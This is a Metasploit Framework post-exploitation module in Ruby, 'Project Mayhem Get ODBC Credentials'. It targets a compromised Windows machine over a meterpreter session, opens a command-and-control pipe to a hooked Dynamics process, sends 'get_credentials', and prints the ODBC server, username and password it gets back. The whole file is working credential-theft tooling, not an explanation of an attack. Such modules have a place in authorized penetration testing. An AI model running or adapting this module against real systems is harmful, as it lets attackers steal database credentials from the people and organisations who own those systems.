##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/project_mayhem'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::ProjectMayhem

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Project Mayhem Get ODBC Credentials',
			'Description'    => %q{
				Get ODBC credentials through a hooked Dynamics process.
			},
			'Author'        => 'Spencer McIntyre',
			'License'       => MSF_LICENSE,
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

	end


	def run
		connect
		print_good("Opened a handle to the C&C pipe")

		begin
			result = execute_command('get_credentials')['result']
		rescue RuntimeError => ex
			print_error(ex.message)
			result = nil
		else
			print_good("Command completed successfully!")
		ensure
			disconnect
		end
		return if result == nil

		print_good("ODBC Credentials - Server: #{result['server']} Username: #{result['username']} Password: #{result['password']}")
	end
end
